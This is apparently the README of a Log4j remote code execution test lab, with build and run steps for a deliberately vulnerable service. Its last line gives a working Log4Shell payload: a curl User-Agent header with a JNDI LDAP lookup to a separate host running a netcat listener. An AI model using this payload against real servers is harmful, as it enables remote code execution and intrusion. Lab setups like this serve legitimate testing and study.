# log4jpwn

log4j rce test environment

![](images/image.png)

## build

Either build the jar on your host with `mvn clean compile assembly:single`

Or use `docker` to build an image with `docker build -t log4jpwn .`

## run

- Run the container with `docker run --rm -p8080:8080 log4jpwn` (or the jar if you built on your host with `java -jar target/log4jpwn-1.0-SNAPSHOT-jar-with-dependencies.jar`)
- Make a `curl` request with a poisoned `User-Agent` header with your payload. eg `curl -H 'User-Agent: ${jndi:ldap://172.16.182.1:8081/a}' localhost:8080`, where 172.16.182.1 is where my netcat lister is running.


